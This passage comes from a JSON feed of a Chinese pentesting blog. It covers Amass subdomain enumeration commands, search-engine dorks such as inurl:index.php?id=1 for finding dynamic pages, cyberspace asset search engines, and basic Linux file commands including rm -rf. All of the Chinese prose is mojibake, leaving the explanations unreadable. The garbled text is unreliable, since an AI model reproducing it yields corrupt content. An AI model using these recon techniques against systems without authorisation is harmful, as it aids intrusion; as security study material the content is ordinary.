amass<br><span class=\"hljs-comment\"># æˆ–è€…ä½¿ç”¨ go å®‰è£…</span><br>go install -v github.com/owasp-amass/amass/v4/...@latest<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ğŸ› -å¸¸è§ç”¨æ³•-2\"><a href=\"#ğŸ› -å¸¸è§ç”¨æ³•-2\" class=\"headerlink\" title=\"ğŸ›  å¸¸è§ç”¨æ³•\"></a>ğŸ›  å¸¸è§ç”¨æ³•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># è¢«åŠ¨æ¨¡å¼æšä¸¾</span><br>amass enum -passive -d example.com<br><br><span class=\"hljs-comment\"># ä¸»åŠ¨æ‰«ææ¨¡å¼ï¼ˆéœ€ DNS è§£ææƒé™ï¼‰</span><br>amass enum -active -d example.com<br><br><span class=\"hljs-comment\"># æš´åŠ›ç ´è§£ + æºä¿¡æ¯æ ‡æ³¨</span><br>amass enum -brute -d example.com -src<br><br><span class=\"hljs-comment\"># è¾“å‡ºç»“æ„åŒ–ç»“æœï¼ˆJSONï¼‰</span><br>amass enum -d example.com -oA amass_output<br><br><span class=\"hljs-comment\"># å¯è§†åŒ–åˆ†æå›¾è°±</span><br>amass viz -d3 -<span class=\"hljs-built_in\">dir</span> amass_output<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"ğŸ“¦-å·¥å…·å¯¹æ¯”æ€»ç»“è¡¨\"><a href=\"#ğŸ“¦-å·¥å…·å¯¹æ¯”æ€»ç»“è¡¨\" class=\"headerlink\" title=\"ğŸ“¦ å·¥å…·å¯¹æ¯”æ€»ç»“è¡¨\"></a>ğŸ“¦ å·¥å…·å¯¹æ¯”æ€»ç»“è¡¨</h2><table>\n<thead>\n<tr>\n<th>å·¥å…·</th>\n<th>æ¨¡å¼</th>\n<th>ç‰¹ç‚¹</th>\n<th>æ˜¯å¦æ”¯æŒæš´åŠ›</th>\n<th>æ˜¯å¦éœ€é…ç½® API</th>\n<th>è¾“å‡ºæ ¼å¼</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>Subfinder</td>\n<td>è¢«åŠ¨</td>\n<td>å¿«é€Ÿã€æ”¯æŒ APIã€å¤šæºæ•´åˆ</td>\n<td>å¦</td>\n<td>æ˜¯ï¼ˆå¯é€‰ï¼‰</td>\n<td>TXT &#x2F; JSON</td>\n</tr>\n<tr>\n<td>Knock</td>\n<td>å­—å…¸æš´åŠ›</td>\n<td>ç®€å•ã€å®šåˆ¶å¼ºã€æ˜“æ‰©å±•</td>\n<td>âœ… æ˜¯</td>\n<td>å¦</td>\n<td>TXT</td>\n</tr>\n<tr>\n<td>TheHarvester</td>\n<td>è¢«åŠ¨</td>\n<td>å¤šç»´æƒ…æŠ¥æ”¶é›†ï¼Œç¤¾å·¥å¿…å¤‡</td>\n<td>å¦</td>\n<td>å¦</td>\n<td>TXT &#x2F; HTML</td>\n</tr>\n<tr>\n<td>Amass</td>\n<td>ä¸»åŠ¨ &#x2F; è¢«åŠ¨ &#x2F; æ··åˆ</td>\n<td>æ¶æ„å®Œæ•´ã€å¯è§†åŒ–è¾“å‡ºã€åŠŸèƒ½æœ€å¼ºå¤§</td>\n<td>âœ… æ˜¯</td>\n<td>âœ… å»ºè®®é…ç½®</td>\n<td>TXT &#x2F; JSON &#x2F; GDF</td>\n</tr>\n</tbody></table>\n",
            "tags": [
                "æ¸—é€æµ‹è¯•",
                "ä¿¡æ¯æ”¶é›†",
                "å­åŸŸå"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/20/%E9%80%9A%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%8A%80%E5%B7%A7/",
            "url": "https://bae-ace.github.io/2025/07/20/%E9%80%9A%E7%94%A8%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%8A%80%E5%B7%A7/",
            "title": "é€šç”¨æœç´¢å¼•æ“æŠ€å·§",
            "date_published": "2025-07-20T15:51:13.000Z",
            "content_html": "<h2 id=\"ğŸ”-é€šç”¨æœç´¢å¼•æ“æŠ€å·§ï¼ˆç™¾åº¦-Google-Bingï¼‰\"><a href=\"#ğŸ”-é€šç”¨æœç´¢å¼•æ“æŠ€å·§ï¼ˆç™¾åº¦-Google-Bingï¼‰\" class=\"headerlink\" title=\"ğŸ” é€šç”¨æœç´¢å¼•æ“æŠ€å·§ï¼ˆç™¾åº¦ &#x2F; Google &#x2F; Bingï¼‰\"></a>ğŸ” é€šç”¨æœç´¢å¼•æ“æŠ€å·§ï¼ˆç™¾åº¦ &#x2F; Google &#x2F; Bingï¼‰</h2><ol>\n<li><p>ğŸŒ <strong>æŒ‰ç½‘ç«™åŸŸåæœç´¢ï¼ˆsiteï¼‰</strong><br>ç”¨äºé™å®šæœç´¢ç»“æœæ¥è‡ªæŸä¸€ç‰¹å®šç½‘ç«™&#x2F;åŸŸåã€‚<br>ç¤ºä¾‹ï¼š<br><code>site:cc.com</code></p>\n</li>\n<li><p>ğŸ”— <strong>æŒ‰é¡µé¢é“¾æ¥ç»“æ„æœç´¢ï¼ˆinurlï¼‰</strong><br>ç”¨äºæœç´¢ URL ä¸­åŒ…å«ç‰¹å®šå…³é”®è¯çš„é¡µé¢ï¼Œå¸¸ç”¨äºæ¢æµ‹ç½‘ç«™è„šæœ¬è¯­è¨€ï¼š<br>ç¤ºä¾‹å…³é”®è¯ï¼š</p>\n<ul>\n<li>PHP ç½‘ç«™ï¼š<code>inurl:index.php?id=1</code></li>\n<li>ASP ç½‘ç«™ï¼š<code>inurl:index.asp?id=1</code></li>\n<li>ASPX ç½‘ç«™ï¼š<code>inurl:index.aspx?id=1</code></li>\n<li>JSP ç½‘ç«™ï¼š<code>inurl:index.jsp?id=1</code></li>\n</ul>\n</li>\n<li><p>ğŸ“› <strong>æŒ‰é¡µé¢æ ‡é¢˜æœç´¢ï¼ˆintitleï¼‰</strong><br>ç”¨äºæœç´¢ç½‘é¡µæ ‡é¢˜ä¸­åŒ…å«ç‰¹å®šå…³é”®è¯çš„é¡µé¢ã€‚<br>ç¤ºä¾‹å…³é”®è¯ï¼š</p>\n<ul>\n<li>åä¼šï¼š<code>intitle:åä¼š</code></li>\n<li>baeï¼š<code>intitle:bae</code></li>\n<li>å¤§ä½¿é¦†ï¼š<code>intitle:å¤§ä½¿é¦†</code></li>\n<li>äº”çœ¼è”ç›Ÿï¼š<code>intitle:äº”çœ¼è”ç›Ÿ</code></li>\n</ul>\n</li>\n<li><p>ğŸ¯ <strong>ç²¾ç¡®åŒ¹é…å…³é”®è¯ï¼ˆåŒå¼•å·ï¼‰</strong><br>ç”¨äºç²¾ç¡®åŒ¹é…çŸ­è¯­æˆ–å…¨åï¼Œä¸å…è®¸ä¸­é—´æ’è¯ã€‚<br>ç¤ºä¾‹ï¼š<br><code>&quot;æ•™è‚²&quot;</code></p>\n</li>\n<li><p>ğŸ”— <strong>ç»„åˆæœç´¢ï¼ˆå¤šä¸ªè¯­æ³•ç»“åˆï¼‰</strong><br>å¯ä»¥å°†å¤šä¸ªè¯­æ³•ç»“åˆä½¿ç”¨ï¼Œæé«˜æœç´¢ç²¾å‡†åº¦ã€‚<br>ç¤ºä¾‹ï¼š<br><code>intitle:bae site:bae.com</code></p>\n</li>\n<li><p>ğŸ“‘ <strong>é«˜çº§æœç´¢ç•Œé¢ï¼ˆç™¾åº¦ï¼‰</strong><br>ä½¿ç”¨ç™¾åº¦æä¾›çš„é«˜çº§æœç´¢ç•Œé¢è¿›è¡Œå›¾å½¢åŒ–é…ç½®ï¼š<br><a href=\"http://www.baidu.com/gaoji/advanced.html\">ç™¾åº¦é«˜çº§æœç´¢</a></p>\n</li>\n</ol>\n<hr>\n<h2 id=\"ğŸ”-Google-æœç´¢ï¼ˆè¯­æ³•ä¸ç™¾åº¦ç±»ä¼¼ï¼‰\"><a href=\"#ğŸ”-Google-æœç´¢ï¼ˆè¯­æ³•ä¸ç™¾åº¦ç±»ä¼¼ï¼‰\" class=\"headerlink\" title=\"ğŸ” Google æœç´¢ï¼ˆè¯­æ³•ä¸ç™¾åº¦ç±»ä¼¼ï¼‰\"></a>ğŸ” Google æœç´¢ï¼ˆè¯­æ³•ä¸ç™¾åº¦ç±»ä¼¼ï¼‰</h2><table>\n<thead>\n<tr>\n<th>åŠŸèƒ½</th>\n<th>æœç´¢è¯­æ³•</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>æŒ‡å®šç«™ç‚¹</td>\n<td><code>site:&quot;cc.com&quot;</code></td>\n</tr>\n<tr>\n<td>PHP</td>\n<td><code>inurl:&quot;index.php?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>ASP</td>\n<td><code>inurl:&quot;index.asp?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>ASPX</td>\n<td><code>inurl:&quot;index.aspx?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>JSP</td>\n<td><code>inurl:&quot;index.jsp?id=1&quot;</code></td>\n</tr>\n<tr>\n<td>æ ‡é¢˜åŒ…å«</td>\n<td><code>intitle:å¤§ä½¿é¦†</code></td>\n</tr>\n<tr>\n<td>ç²¾ç¡®æœç´¢</td>\n<td><code>&quot;æ•™è‚²&quot;</code></td>\n</tr>\n<tr>\n<td>ç»„åˆæœç´¢</td>\n<td><code>intitle:bae site:bae.com</code></td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"ğŸ›°ï¸-ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼ˆèµ„äº§æœç´¢ï¼‰\"><a href=\"#ğŸ›°ï¸-ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼ˆèµ„äº§æœç´¢ï¼‰\" class=\"headerlink\" title=\"ğŸ›°ï¸ ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼ˆèµ„äº§æœç´¢ï¼‰\"></a>ğŸ›°ï¸ ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼ˆèµ„äº§æœç´¢ï¼‰</h2><table>\n<thead>\n<tr>\n<th>å¹³å°</th>\n<th>ç½‘å€</th>\n<th>åŠŸèƒ½è¯´æ˜</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>ZoomEye</td>\n<td><a href=\"https://www.zoomeye.org/\">ZoomEye - Cyberspace Search Engine</a></td>\n<td>ä¸­å›½å¼€å‘çš„ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼Œå¯æœç´¢ä¸»æœºã€æœåŠ¡ã€ç»„ä»¶</td>\n</tr>\n<tr>\n<td>FOFA</td>\n<td><a href=\"https://fofa.info/\">FOFA</a></td>\n<td>é¢å‘å®‰å…¨ç ”ç©¶äººå‘˜çš„èµ„äº§æœç´¢å¼•æ“ï¼Œæ”¯æŒè¯­æ³•åŒ–æŸ¥è¯¢</td>\n</tr>\n<tr>\n<td>Shodan</td>\n<td><a href=\"https://www.shodan.io/\">Shodan</a></td>\n<td>å›½å¤–æœ€çŸ¥åçš„ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼Œå¯æŸ¥å¼€æ”¾ç«¯å£ã€è®¾å¤‡ç³»ç»Ÿä¿¡æ¯ç­‰</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"âœ…-æ€»ç»“å¯¹æ¯”è¡¨\"><a href=\"#âœ…-æ€»ç»“å¯¹æ¯”è¡¨\" class=\"headerlink\" title=\"âœ… æ€»ç»“å¯¹æ¯”è¡¨\"></a>âœ… æ€»ç»“å¯¹æ¯”è¡¨</h2><table>\n<thead>\n<tr>\n<th>æœç´¢æ–¹å¼</th>\n<th>å…¸å‹è¯­æ³•</th>\n<th>ä¸»è¦ç”¨é€”</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>site:</code></td>\n<td><code>site:cc.com</code></td>\n<td>é™å®šæœç´¢åŸŸå</td>\n</tr>\n<tr>\n<td><code>inurl:</code></td>\n<td><code>inurl:index.php?id=1</code></td>\n<td>æœç´¢ç½‘ç«™ç»“æ„&#x2F;è„šæœ¬è¯­è¨€</td>\n</tr>\n<tr>\n<td><code>intitle:</code></td>\n<td><code>intitle:bae</code></td>\n<td>é¡µé¢æ ‡é¢˜åŒ¹é…</td>\n</tr>\n<tr>\n<td><code>&quot;&quot;</code>ï¼ˆåŒå¼•å·ï¼‰</td>\n<td><code>&quot;æ•™è‚²&quot;</code></td>\n<td>ç²¾ç¡®çŸ­è¯­æœç´¢</td>\n</tr>\n<tr>\n<td>å¤šè¯­æ³•ç»„åˆ</td>\n<td><code>intitle:åä¼š site:gov.cn</code></td>\n<td>ç²¾å‡†å®šä½å†…å®¹</td>\n</tr>\n<tr>\n<td>ZoomEye &#x2F; FOFA &#x2F; Shodan</td>\n<td>Web ç•Œé¢ &#x2F; API</td>\n<td>ç½‘ç»œç©ºé—´èµ„äº§æœç´¢ï¼Œå®‰å…¨æƒ…æŠ¥åˆ†æ</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\"><br></code></pre></td></tr></table></figure>",
            "tags": [
                "linux",
                "å‘½ä»¤"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/07/20/linux%E5%9F%BA%E7%A1%80/",
            "url": "https://bae-ace.github.io/2025/07/20/linux%E5%9F%BA%E7%A1%80/",
            "title": "linuxåŸºç¡€",
            "date_published": "2025-07-20T07:41:52.000Z",
            "content_html": "<h1 id=\"Linux-æ“ä½œåŸºç¡€æ–‡æ¡£\"><a href=\"#Linux-æ“ä½œåŸºç¡€æ–‡æ¡£\" class=\"headerlink\" title=\"Linux æ“ä½œåŸºç¡€æ–‡æ¡£\"></a>Linux æ“ä½œåŸºç¡€æ–‡æ¡£</h1><h2 id=\"ä¸€ã€è¿œç¨‹ç™»å½•ä¸å…³æœº-é‡å¯æ“ä½œ\"><a href=\"#ä¸€ã€è¿œç¨‹ç™»å½•ä¸å…³æœº-é‡å¯æ“ä½œ\" class=\"headerlink\" title=\"ä¸€ã€è¿œç¨‹ç™»å½•ä¸å…³æœº&#x2F;é‡å¯æ“ä½œ\"></a>ä¸€ã€è¿œç¨‹ç™»å½•ä¸å…³æœº&#x2F;é‡å¯æ“ä½œ</h2><h3 id=\"è¿œç¨‹ç™»å½•\"><a href=\"#è¿œç¨‹ç™»å½•\" class=\"headerlink\" title=\"è¿œç¨‹ç™»å½•\"></a>è¿œç¨‹ç™»å½•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">ssh root@192.168.202.136<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"æ–­å¼€è¿æ¥\"><a href=\"#æ–­å¼€è¿æ¥\" class=\"headerlink\" title=\"æ–­å¼€è¿æ¥\"></a>æ–­å¼€è¿æ¥</h3><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\"><span class=\"hljs-keyword\">exit</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"é‡å¯ç³»ç»Ÿ\"><a href=\"#é‡å¯ç³»ç»Ÿ\" class=\"headerlink\" title=\"é‡å¯ç³»ç»Ÿ\"></a>é‡å¯ç³»ç»Ÿ</h3><figure class=\"highlight autoit\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs autoit\">reboot<br><span class=\"hljs-meta\"># æˆ–è€…</span><br><span class=\"hljs-built_in\">shutdown</span> -r now<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"é»˜è®¤30ç§’åå…³æœº\"><a href=\"#é»˜è®¤30ç§’åå…³æœº\" class=\"headerlink\" title=\"é»˜è®¤30ç§’åå…³æœº\"></a>é»˜è®¤30ç§’åå…³æœº</h3><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arduino\">shutdown<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"ç«‹å³å…³æœº\"><a href=\"#ç«‹å³å…³æœº\" class=\"headerlink\" title=\"ç«‹å³å…³æœº\"></a>ç«‹å³å…³æœº</h3><figure class=\"highlight arcade\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs arcade\">shutdown -h <span class=\"hljs-built_in\">now</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"10åˆ†é’Ÿåå…³æœº\"><a href=\"#10åˆ†é’Ÿåå…³æœº\" class=\"headerlink\" title=\"10åˆ†é’Ÿåå…³æœº\"></a>10åˆ†é’Ÿåå…³æœº</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">shutdown</span> -h <span class=\"hljs-number\">10</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"äºŒã€æ–‡ä»¶å’Œç›®å½•æ“ä½œ\"><a href=\"#äºŒã€æ–‡ä»¶å’Œç›®å½•æ“ä½œ\" class=\"headerlink\" title=\"äºŒã€æ–‡ä»¶å’Œç›®å½•æ“ä½œ\"></a>äºŒã€æ–‡ä»¶å’Œç›®å½•æ“ä½œ</h2><h3 id=\"1-åˆ›å»ºæ–‡ä»¶\"><a href=\"#1-åˆ›å»ºæ–‡ä»¶\" class=\"headerlink\" title=\"1. åˆ›å»ºæ–‡ä»¶\"></a>1. åˆ›å»ºæ–‡ä»¶</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">touch</span> 1.txt                <span class=\"hljs-comment\"># åˆ›å»ºå•ä¸ªæ–‡ä»¶</span><br><span class=\"hljs-built_in\">touch</span> <span class=\"hljs-built_in\">test</span>&#123;1..10&#125;.txt      <span class=\"hljs-comment\"># æ‰¹é‡åˆ›å»ºæ–‡ä»¶ test1.txt åˆ° test10.txt</span><br><span class=\"hljs-built_in\">touch</span> <span class=\"hljs-built_in\">test</span>&#123;a..f&#125;.txt       <span class=\"hljs-comment\"># æ‰¹é‡åˆ›å»º testa.txt åˆ° testf.txt</span><br><span class=\"hljs-built_in\">touch</span> /root/4.txt          <span class=\"hljs-comment\"># æŒ‡å®šè·¯å¾„åˆ›å»ºæ–‡ä»¶</span><br></code></pre></td></tr></table></figure>\n\n<p>âš ï¸ <code>touch</code> ä¸ä¼šè¦†ç›–å·²æœ‰åŒåæ–‡ä»¶ã€‚</p>\n<h3 id=\"2-æŸ¥çœ‹ç›®å½•æ–‡ä»¶\"><a href=\"#2-æŸ¥çœ‹ç›®å½•æ–‡ä»¶\" class=\"headerlink\" title=\"2. æŸ¥çœ‹ç›®å½•æ–‡ä»¶\"></a>2. æŸ¥çœ‹ç›®å½•æ–‡ä»¶</h3><figure class=\"highlight jboss-cli\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs jboss-cli\"><span class=\"hljs-keyword\">ls</span>                        <span class=\"hljs-comment\"># æŸ¥çœ‹å½“å‰ç›®å½•å†…å®¹</span><br><span class=\"hljs-keyword\">ls</span> test09.txt             <span class=\"hljs-comment\"># æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><br><span class=\"hljs-keyword\">ls</span> *<span class=\"hljs-string\">.txt</span>                  <span class=\"hljs-comment\"># æŸ¥çœ‹æ‰€æœ‰ txt æ–‡ä»¶</span><br><span class=\"hljs-keyword\">ls</span> -1                     <span class=\"hljs-comment\"># æ¯è¡Œæ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶ï¼ˆæ³¨æ„æ˜¯æ•°å­—1ï¼‰</span><br><span class=\"hljs-keyword\">ls</span> -a                     <span class=\"hljs-comment\"># æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼ŒåŒ…æ‹¬éšè—æ–‡ä»¶</span><br><span class=\"hljs-keyword\">ls</span> -a -1                  <span class=\"hljs-comment\"># æ‰€æœ‰æ–‡ä»¶ + æ¯è¡Œä¸€ä¸ª</span><br><span class=\"hljs-keyword\">ls</span> -l                     <span class=\"hljs-comment\"># è¯¦ç»†ä¿¡æ¯åˆ—è¡¨</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-ç§»åŠ¨ä¸é‡å‘½åæ–‡ä»¶\"><a href=\"#3-ç§»åŠ¨ä¸é‡å‘½åæ–‡ä»¶\" class=\"headerlink\" title=\"3. ç§»åŠ¨ä¸é‡å‘½åæ–‡ä»¶\"></a>3. ç§»åŠ¨ä¸é‡å‘½åæ–‡ä»¶</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">mv</span> 222.txt 123.txt        <span class=\"hljs-comment\"># é‡å‘½å</span><br><span class=\"hljs-built_in\">mv</span> 123.txt /opt           <span class=\"hljs-comment\"># ç§»åŠ¨æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•</span><br><span class=\"hljs-built_in\">mv</span> aaa wulaoban           <span class=\"hljs-comment\"># é‡å‘½åæ–‡ä»¶å¤¹</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-å¤åˆ¶æ–‡ä»¶-ç›®å½•\"><a href=\"#4-å¤åˆ¶æ–‡ä»¶-ç›®å½•\" class=\"headerlink\" title=\"4. å¤åˆ¶æ–‡ä»¶&#x2F;ç›®å½•\"></a>4. å¤åˆ¶æ–‡ä»¶&#x2F;ç›®å½•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cp</span> test01.txt /opt/       <span class=\"hljs-comment\"># å¤åˆ¶æ–‡ä»¶</span><br><span class=\"hljs-built_in\">cp</span> -a dev04 /opt/         <span class=\"hljs-comment\"># å¤åˆ¶æ•´ä¸ªç›®å½•ï¼ˆéœ€åœ¨å…¶ä¸Šä¸€çº§ç›®å½•æ‰§è¡Œï¼‰</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"5-åˆ é™¤æ–‡ä»¶-ç›®å½•ï¼ˆå±é™©æ“ä½œâ—ï¼‰\"><a href=\"#5-åˆ é™¤æ–‡ä»¶-ç›®å½•ï¼ˆå±é™©æ“ä½œâ—ï¼‰\" class=\"headerlink\" title=\"5. åˆ é™¤æ–‡ä»¶&#x2F;ç›®å½•ï¼ˆå±é™©æ“ä½œâ—ï¼‰\"></a>5. åˆ é™¤æ–‡ä»¶&#x2F;ç›®å½•ï¼ˆå±é™©æ“ä½œâ—ï¼‰</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">rm</span> /opt/123.txt           <span class=\"hljs-comment\"># åˆ é™¤æ–‡ä»¶ï¼ˆéœ€ç¡®è®¤ï¼‰</span><br><span class=\"hljs-built_in\">rm</span> -f /opt/test01.txt     <span class=\"hljs-comment\"># å¼ºåˆ¶åˆ é™¤</span><br><span class=\"hljs-built_in\">rm</span> file1 file2 file3      <span class=\"hljs-comment\"># åˆ é™¤å¤šä¸ªæ–‡ä»¶</span><br><span class=\"hljs-built_in\">rm</span> -rf dev                <span class=\"hljs-comment\"># å¼ºåˆ¶é€’å½’åˆ é™¤ç›®å½•</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"6-åˆ›å»ºç›®å½•\"><a href=\"#6-åˆ›å»ºç›®å½•\" class=\"headerlink\" title=\"6. åˆ›å»ºç›®å½•\"></a>6. åˆ›å»ºç›®å½•</h3><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">mkdir</span> dev                 # åˆ›å»ºå•ä¸ªç›®å½•<br><span class=\"hljs-attribute\">mkdir</span> dev&#123;<span class=\"hljs-number\">01</span>..<span class=\"hljs-number\">10</span>&#125;         # æ‰¹é‡åˆ›å»ºç›®å½•<br><span class=\"hljs-attribute\">mkdir</span> -p <span class=\"hljs-number\">1</span>/<span class=\"hljs-number\">2</span>/<span class=\"hljs-number\">3</span>/<span class=\"hljs-number\">4</span>/<span class=\"hljs-number\">5</span>/<span class=\"hljs-number\">6</span>      # åˆ›å»ºå¤šçº§å­ç›®å½•<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"7-åˆ‡æ¢ç›®å½•\"><a href=\"#7-åˆ‡æ¢ç›®å½•\" class=\"headerlink\" title=\"7. åˆ‡æ¢ç›®å½•\"></a>7. åˆ‡æ¢ç›®å½•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">cd</span> <span class=\"hljs-built_in\">local</span>                  <span class=\"hljs-comment\"># è¿›å…¥ local ç›®å½•</span><br><span class=\"hljs-built_in\">cd</span> /usr/local             <span class=\"hljs-comment\"># è¿›å…¥æŒ‡å®šè·¯å¾„</span><br><span class=\"hljs-built_in\">cd</span> ..                     <span class=\"hljs-comment\"># è¿”å›ä¸Šä¸€çº§ç›®å½•</span><br><span class=\"hljs-built_in\">cd</span> ../..                  <span class=\"hljs-comment\"># è¿”å›ä¸Šä¸¤çº§ç›®å½•</span><br><span class=\"hljs-built_in\">cd</span> /                      <span class=\"hljs-comment\"># è¿›å…¥æ ¹ç›®å½•</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"8-æ‰“å°å½“å‰ç›®å½•\"><a href=\"#8-æ‰“å°å½“å‰ç›®å½•\" class=\"headerlink\" title=\"8. æ‰“å°å½“å‰ç›®å½•\"></a>8. æ‰“å°å½“å‰ç›®å½•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">pwd</span>                       <span class=\"hljs-comment\"># æ˜¾ç¤ºå½“å‰è·¯å¾„</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"9-å†å²å‘½ä»¤æŸ¥è¯¢\"><a href=\"#9-å†å²å‘½ä»¤æŸ¥è¯¢\" class=\"headerlink\" title=\"9. å†å²å‘½ä»¤æŸ¥è¯¢\"></a>9. å†å²å‘½ä»¤æŸ¥è¯¢</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-built_in\">history</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"ä¸‰ã€æ–‡æœ¬æ“ä½œä¸æŸ¥çœ‹\"><a href=\"#ä¸‰ã€æ–‡æœ¬æ“ä½œä¸æŸ¥çœ‹\" class=\"headerlink\" title=\"ä¸‰ã€æ–‡æœ¬æ“ä½œä¸æŸ¥çœ‹\"></a>ä¸‰ã€æ–‡æœ¬æ“ä½œä¸æŸ¥çœ‹</h2><h3 id=\"10-vi-ç¼–è¾‘å™¨ï¼ˆä¸‰ç§æ¨¡å¼ï¼‰\"><a href=\"#10-vi-ç¼–è¾‘å™¨ï¼ˆä¸‰ç§æ¨¡å¼ï¼‰\" class=\"headerlink\" title=\"10. vi ç¼–è¾‘å™¨ï¼ˆä¸‰ç§æ¨¡å¼ï¼‰\"></a>10. vi ç¼–è¾‘å™¨ï¼ˆä¸‰ç§æ¨¡å¼ï¼‰</h3><figure class=\"highlight nginx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">vi</span> test03.txt             <span class=\"hljs-comment\"># æ‰“å¼€æ–‡ä»¶ç¼–è¾‘</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>ç¼–è¾‘æ¨¡å¼: è¾“å…¥ <code>a/i/o</code> è¿›å…¥ç¼–è¾‘</li>\n<li>å¸¸è§„æ¨¡å¼: æŒ‰ <code>esc</code> å›åˆ°é»˜è®¤</li>\n<li>å‘½ä»¤æ¨¡å¼: è¾“å…¥ <code>:</code> 